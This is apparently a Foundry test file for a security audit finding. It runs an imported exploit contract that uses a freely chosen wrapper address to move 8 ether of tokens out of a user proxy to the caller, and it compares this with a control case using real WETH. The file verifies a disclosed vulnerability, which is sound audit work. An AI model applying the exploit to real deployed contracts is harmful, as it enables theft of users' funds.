// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    Lockup,
    ProxyTarget,
    RealWETH,
    UserProxy
} from "./54668-wrapped-native-asset-address-can-be-freely-chosen-and-is-ass.sol";

contract Finding54668Test is Test {
    receive() external payable {}

    function test_exploit_chosen_wrapper_sends_proxy_tokens_to_caller() public {
        Exploit e = new Exploit();
        vm.deal(address(this), 9 ether);
        e.run{value: 8 ether}();

        assertEq(e.attackerGot(), 8 ether, "caller received the proxy balance");
        assertEq(e.token().balanceOf(address(this)), 8 ether, "8 tokens landed on the caller");
        assertEq(e.proxyAfter(), 0, "proxy was emptied");
        assertEq(e.wrapperMinted(), 0, "deposit minted nothing");
        assertEq(e.proxyFunded(), 8 ether, "proxy held 8 before the wrap");
    }

    function test_control_real_weth_keeps_the_existing_balance() public {
        RealWETH weth = new RealWETH();
        Lockup lockup = new Lockup();
        ProxyTarget target = new ProxyTarget();
        UserProxy proxy = new UserProxy(address(this));

        weth.mint(address(proxy), 8 ether);
        vm.deal(address(this), 8 ether);

        ProxyTarget.CreateWithDurations memory params = ProxyTarget.CreateWithDurations({
            recipient: address(this),
            totalAmount: 0,
            asset: address(weth)
        });
        proxy.execute{value: 8 ether}(
            address(target), abi.encodeCall(ProxyTarget.wrapAndCreateWithDurations, (address(lockup), params))
        );

        assertEq(weth.balanceOf(address(proxy)), 8 ether, "pre-existing WETH stays");
        assertEq(weth.balanceOf(address(this)), 8 ether, "caller receives only the ETH just wrapped");
    }
}
